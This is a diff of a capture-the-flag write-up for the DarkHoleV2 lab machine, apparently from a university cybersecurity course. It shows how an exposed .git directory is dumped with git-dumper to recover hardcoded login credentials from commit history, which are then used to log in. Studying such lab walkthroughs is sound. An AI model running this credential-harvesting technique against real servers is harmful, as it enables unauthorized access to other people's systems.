@@ -42,9 +42,54 @@ So we have this relevant information:
 
 So if we search the ip in the broswer we can see this is the main page
 
-![Main page DarkHoleV2](ctf4/imagen_2022-06-17_095914094.png)
+![Index page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_095914094.png)
 
 In this page there is any information relevant or important for us, so we look now in the login.php
 
-![Login page DarkHoleV2](ctf4/imagen_2022-06-17_100010931.png)
+![Login page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100010931.png)
 
+Here we can see there is a login page, but we don´t have any credential yet, so we can´t do nothing here.
+Lets move to the last thing we can see here the directory `.git`
+
+![.git page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100133653.png)
+
+We can see  in the git history  in the directory `logs` and in the file `COMMIT_EDITMSG` we can read .
+>i changed login.php file for more secure
+
+So now that we know there is a vulnerability we want to see the content of the commmits done. There is a usefull tool call git-dumper to see the content of the commits.
+
+So we install it first.
+```bash
+$ pip install git-dumper
+
+$ git-dumper http://192.168.10.17 ~/website
+```
+Now that we have stored the content of the web in the our directory `~/website` we are runing the command `git diff` and the commit id for seeing the the login.php that were before.
+```bash
+$ git diff a4d900a8d85e8938d3601f3cef113ee293028e10
+
+diff --git a/login.php b/login.php
+index 8a0ff67..0904b19 100644
+--- a/login.php
++++ b/login.php
+@@ -2,7 +2,10 @@
+ session_start();
+ require 'config/config.php';
+ if($_SERVER['REQUEST_METHOD'] == 'POST'){
+-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
++    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
++    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
++    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
++    if($check->num_rows){
+         $_SESSION['userid'] = 1;
+         header("location:dashboard.php");
+         die();
+
+```
+We use this id because it has as commit message .
+>   I added login.php file with default credentials
+ 
+ So now that we have the credentials `lush@admin.com` and `321` as user and password.
+
+ Now we login in and there it is the profil page of our user.
+![user page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_104736996.png)
